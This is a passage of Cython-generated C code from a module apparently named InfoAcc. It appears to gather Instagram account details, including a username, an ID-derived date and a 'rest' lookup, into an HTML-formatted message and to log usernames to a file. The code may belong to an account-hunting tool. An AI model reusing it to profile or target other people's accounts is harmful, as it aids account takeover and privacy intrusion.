    __Pyx_INCREF(__pyx_n_u_user);
    __Pyx_GIVEREF(__pyx_n_u_user);
    PyTuple_SET_ITEM(__pyx_t_1, 0+__pyx_t_10, __pyx_n_u_user);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_1, 1+__pyx_t_10, __pyx_t_3);
    __pyx_t_3 = 0;
    __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_1, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 670, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_get); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 670, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__50, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 670, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_v_fowg = __pyx_t_8;
  __pyx_t_8 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_rrr, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 671, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 671, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_18 = NULL;
  __pyx_t_10 = 0;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_18)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_18);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
      __pyx_t_10 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_1)) {
    PyObject *__pyx_temp[3] = {__pyx_t_18, __pyx_n_u_result, __pyx_t_3};
    __pyx_t_4 = __Pyx_PyFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 671, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_1)) {
    PyObject *__pyx_temp[3] = {__pyx_t_18, __pyx_n_u_result, __pyx_t_3};
    __pyx_t_4 = __Pyx_PyCFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 671, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  } else
  #endif
  {
    __pyx_t_2 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 671, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    if (__pyx_t_18) {
      __Pyx_GIVEREF(__pyx_t_18); PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_18); __pyx_t_18 = NULL;
    }
    __Pyx_INCREF(__pyx_n_u_result);
    __Pyx_GIVEREF(__pyx_n_u_result);
    PyTuple_SET_ITEM(__pyx_t_2, 0+__pyx_t_10, __pyx_n_u_result);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_2, 1+__pyx_t_10, __pyx_t_3);
    __pyx_t_3 = 0;
    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_2, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 671, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 671, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 671, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_2 = NULL;
  __pyx_t_10 = 0;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
      __pyx_t_10 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_1)) {
    PyObject *__pyx_temp[3] = {__pyx_t_2, __pyx_n_u_user, __pyx_t_4};
    __pyx_t_8 = __Pyx_PyFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 671, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_1)) {
    PyObject *__pyx_temp[3] = {__pyx_t_2, __pyx_n_u_user, __pyx_t_4};
    __pyx_t_8 = __Pyx_PyCFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 671, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  } else
  #endif
  {
    __pyx_t_3 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 671, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    if (__pyx_t_2) {
      __Pyx_GIVEREF(__pyx_t_2); PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_2); __pyx_t_2 = NULL;
    }
    __Pyx_INCREF(__pyx_n_u_user);
    __Pyx_GIVEREF(__pyx_n_u_user);
    PyTuple_SET_ITEM(__pyx_t_3, 0+__pyx_t_10, __pyx_n_u_user);
    __Pyx_GIVEREF(__pyx_t_4);
    PyTuple_SET_ITEM(__pyx_t_3, 1+__pyx_t_10, __pyx_t_4);
    __pyx_t_4 = 0;
    __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_3, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 671, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 671, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__51, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 671, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_pp = __pyx_t_8;
  __pyx_t_8 = 0;

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_7, &__pyx_t_6, &__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_7);
    __Pyx_XGOTREF(__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_5);
    /*try:*/ {

      
      __pyx_t_19 = (__Pyx_PyUnicode_Equals(__pyx_v_Id, __pyx_n_u_none, Py_NE)); if (unlikely(__pyx_t_19 < 0)) __PYX_ERR(0, 674, __pyx_L20_error)
      if (__pyx_t_19) {
        __pyx_t_1 = __Pyx_PyNumber_Int(__pyx_v_Id); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 674, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_8 = __pyx_t_1;
        __pyx_t_1 = 0;
      } else {
        __Pyx_INCREF(Py_None);
        __pyx_t_8 = Py_None;
      }
      __pyx_v_hy = __pyx_t_8;
      __pyx_t_8 = 0;

      
      __pyx_t_19 = __Pyx_PyObject_IsTrue(__pyx_v_hy); if (unlikely(__pyx_t_19 < 0)) __PYX_ERR(0, 675, __pyx_L20_error)
      if (__pyx_t_19) {
        __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_date); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 675, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_4 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
          __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
          if (likely(__pyx_t_4)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
            __Pyx_INCREF(__pyx_t_4);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_3, function);
          }
        }
        __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_4, __pyx_v_hy) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_v_hy);
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 675, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_8 = __pyx_t_1;
        __pyx_t_1 = 0;
      } else {
        __Pyx_INCREF(__pyx_n_u_none);
        __pyx_t_8 = __pyx_n_u_none;
      }
      __pyx_v_datte = __pyx_t_8;
      __pyx_t_8 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    goto __pyx_L25_try_end;
    __pyx_L20_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    
    __pyx_t_10 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
    if (__pyx_t_10) {
      __Pyx_AddTraceback("source.InfoAcc", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_8, &__pyx_t_1, &__pyx_t_3) < 0) __PYX_ERR(0, 676, __pyx_L22_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_3);

      
      __Pyx_INCREF(__pyx_n_u_none);
      __Pyx_XDECREF_SET(__pyx_v_datte, __pyx_n_u_none);
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L21_exception_handled;
    }
    goto __pyx_L22_except_error;
    __pyx_L22_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_6, __pyx_t_5);
    goto __pyx_L1_error;
    __pyx_L21_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_6, __pyx_t_5);
    __pyx_L25_try_end:;
  }

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_aca); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 679, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_1 = __Pyx_PyInt_AddObjC(__pyx_t_3, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 679, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_aca, __pyx_t_1) < 0) __PYX_ERR(0, 679, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyTuple_New(13); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 680, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_20 = 0;
  __pyx_t_21 = 127;
  __Pyx_INCREF(__pyx_kp_u__52);
  __pyx_t_21 = (1114111 > __pyx_t_21) ? 1114111 : __pyx_t_21;
  __pyx_t_20 += 39;
  __Pyx_GIVEREF(__pyx_kp_u__52);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u__52);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_aca); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 680, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 680, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_21;
  __pyx_t_20 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
  __Pyx_GIVEREF(__pyx_t_8);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_8);
  __pyx_t_8 = 0;
  __Pyx_INCREF(__pyx_kp_u_code);
  __pyx_t_21 = (1114111 > __pyx_t_21) ? 1114111 : __pyx_t_21;
  __pyx_t_20 += 18;
  __Pyx_GIVEREF(__pyx_kp_u_code);
  PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u_code);
  __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_v_username, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 680, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_21;
  __pyx_t_20 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
  __Pyx_GIVEREF(__pyx_t_8);
  PyTuple_SET_ITEM(__pyx_t_1, 3, __pyx_t_8);
  __pyx_t_8 = 0;
  __Pyx_INCREF(__pyx_kp_u_code_code);
  __pyx_t_21 = (1114111 > __pyx_t_21) ? 1114111 : __pyx_t_21;
  __pyx_t_20 += 22;
  __Pyx_GIVEREF(__pyx_kp_u_code_code);
  PyTuple_SET_ITEM(__pyx_t_1, 4, __pyx_kp_u_code_code);
  __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_v_username, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 680, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_21;
  __pyx_t_20 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
  __Pyx_GIVEREF(__pyx_t_8);
  PyTuple_SET_ITEM(__pyx_t_1, 5, __pyx_t_8);
  __pyx_t_8 = 0;
  __Pyx_INCREF(__pyx_kp_u__31);
  __pyx_t_20 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__31);
  PyTuple_SET_ITEM(__pyx_t_1, 6, __pyx_kp_u__31);
  __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_v_gg, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 680, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_21;
  __pyx_t_20 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
  __Pyx_GIVEREF(__pyx_t_8);
  PyTuple_SET_ITEM(__pyx_t_1, 7, __pyx_t_8);
  __pyx_t_8 = 0;
  __Pyx_INCREF(__pyx_kp_u_code_code_2);
  __pyx_t_21 = (1114111 > __pyx_t_21) ? 1114111 : __pyx_t_21;
  __pyx_t_20 += 23;
  __Pyx_GIVEREF(__pyx_kp_u_code_code_2);
  PyTuple_SET_ITEM(__pyx_t_1, 8, __pyx_kp_u_code_code_2);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_rest); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 680, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_8 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_4, __pyx_v_username) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_v_username);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 680, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_8, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 680, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_21;
  __pyx_t_20 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 9, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u_code_a_href_https_instagram_com);
  __pyx_t_21 = (1114111 > __pyx_t_21) ? 1114111 : __pyx_t_21;
  __pyx_t_20 += 71;
  __Pyx_GIVEREF(__pyx_kp_u_code_a_href_https_instagram_com);
  PyTuple_SET_ITEM(__pyx_t_1, 10, __pyx_kp_u_code_a_href_https_instagram_com);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_v_username, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 680, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_21;
  __pyx_t_20 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 11, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u_a_Python_Tools7_MrSnuff);
  __pyx_t_21 = (1114111 > __pyx_t_21) ? 1114111 : __pyx_t_21;
  __pyx_t_20 += 68;
  __Pyx_GIVEREF(__pyx_kp_u_a_Python_Tools7_MrSnuff);
  PyTuple_SET_ITEM(__pyx_t_1, 12, __pyx_kp_u_a_Python_Tools7_MrSnuff);
  __pyx_t_3 = __Pyx_PyUnicode_Join(__pyx_t_1, 13, __pyx_t_20, __pyx_t_21); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 680, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_tlg = ((PyObject*)__pyx_t_3);
  __pyx_t_3 = 0;

  
  /*with:*/ {
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__53, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 696, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_5 = __Pyx_PyObject_LookupSpecial(__pyx_t_3, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 696, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_8 = __Pyx_PyObject_LookupSpecial(__pyx_t_3, __pyx_n_s_enter); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 696, __pyx_L28_error)
    __Pyx_GOTREF(__pyx_t_8);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_8);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_8, function);
      }
    }
    __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 696, __pyx_L28_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_8 = __pyx_t_1;
    __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    /*try:*/ {
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_7, &__pyx_t_17);
        __Pyx_XGOTREF(__pyx_t_6);
        __Pyx_XGOTREF(__pyx_t_7);
        __Pyx_XGOTREF(__pyx_t_17);
        /*try:*/ {
          __pyx_v_ff = __pyx_t_8;
          __pyx_t_8 = 0;

          
          __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_ff, __pyx_n_s_write); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 697, __pyx_L32_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_v_username, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 697, __pyx_L32_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_4 = __Pyx_PyUnicode_Concat(__pyx_t_1, __pyx_kp_u_); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 697, __pyx_L32_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_1 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
            __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_3);
            if (likely(__pyx_t_1)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
              __Pyx_INCREF(__pyx_t_1);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_3, function);
            }
          }
          __pyx_t_8 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_1, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4);
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 697, __pyx_L32_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

          
        }
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
        goto __pyx_L37_try_end;
        __pyx_L32_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        /*except:*/ {
          __Pyx_AddTraceback("source.InfoAcc", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_8, &__pyx_t_3, &__pyx_t_4) < 0) __PYX_ERR(0, 696, __pyx_L34_except_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_1 = PyTuple_Pack(3, __pyx_t_8, __pyx_t_3, __pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 696, __pyx_L34_except_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_16 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_t_1, NULL);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 696, __pyx_L34_except_error)
          __Pyx_GOTREF(__pyx_t_16);
          __pyx_t_19 = __Pyx_PyObject_IsTrue(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          if (__pyx_t_19 < 0) __PYX_ERR(0, 696, __pyx_L34_except_error)
          __pyx_t_22 = ((!(__pyx_t_19 != 0)) != 0);
          if (__pyx_t_22) {
            __Pyx_GIVEREF(__pyx_t_8);
            __Pyx_GIVEREF(__pyx_t_3);
            __Pyx_XGIVEREF(__pyx_t_4);
            __Pyx_ErrRestoreWithState(__pyx_t_8, __pyx_t_3, __pyx_t_4);
            __pyx_t_8 = 0; __pyx_t_3 = 0; __pyx_t_4 = 0; 
            __PYX_ERR(0, 696, __pyx_L34_except_error)
          }
          __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          goto __pyx_L33_exception_handled;
        }
        __pyx_L34_except_error:;
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_17);
        __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_17);
        goto __pyx_L1_error;
        __pyx_L33_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_XGIVEREF(__pyx_t_7);
        __Pyx_XGIVEREF(__pyx_t_17);
